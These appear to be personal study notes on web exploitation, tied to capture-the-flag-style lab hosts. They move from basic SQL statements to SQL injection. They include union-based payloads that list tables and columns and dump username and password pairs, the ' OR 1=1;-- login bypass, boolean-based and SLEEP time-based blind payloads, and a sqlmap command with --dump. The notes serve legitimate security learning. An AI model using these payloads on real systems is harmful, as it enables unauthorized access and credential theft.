#WebExploitation

## SQL
##### *Select*
>`select * from users;`
>`select * from users LIMIT 1,1;` -> this forces the query to skip the first result and return the first row after that one
>Like clauses allow to search for data that kind of fits the criteria 
>% -> wildcard that represents characters, depends where you put it
>`select * from users where username like 'a%';` -> usernames that begin with a
>`select * from users where username like '%n';` -> usernames that end with n
>`select * from users where username like '%mi%';` -> usernames that contain mi

##### *Union*
Combines the result of two or more select statements, must retrieve same numbers of  columns, they must be of similar data types and the order has to be the same
>`select * from customers UNION select * from companies;`

##### *Insert*
>`insert into users (username,password) values ('bob','password123');`

##### *Update*
>`update users SET username='root',password='pass123' where username='admin';`

##### *Delete*
>`delete from users where username='martin';`
>`delete from users` -> deletes the whole table info since no where clause was specified

---
#### Sql Injection
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

##### In-Band
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results

##### Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen

##### Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page

*Use union select to guess the number of columns*
http://sqli.nahamsec.thm/article?id=1%20union%20select%201,2,3,4;--
>%20 is a space
>Sometimes that `'` is not needed

version() -> version of the db
database() -> database name
`0 UNION SELECT 1,2,database()`
Obtain table names from the database
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
Obtain column names from an specific table
`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

*Usar tambien SELECT ALL*

##### Blind SQLi
Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless

###### Authentication Bypass
Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table
*`' OR 1=1;--`*

###### Boolean Based
Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

###### Time Based
A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

`referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--`

![[SQLI.JPG]]
http://sqli2.nahamsec.thm/article-count?date=May+2020%27%20and%20substring(@@version,1,1)=5%20and%201=%271
>%27 is a `'`

### Sqlmap
Useful sqlmap flags
```sqlmap
sqlmap -r req.txt --level 5 --risk 3 --batch --threads 10 -D nahamstore -T sqli_two -C flag --dump
```
Use a wildcard next to post parameters, turn the request into a .txt
`-r` -> use a file
`--batch`
`-dbs`
`-D`
`--tables`
`-T`
`--columns`
`-C`
`--dump`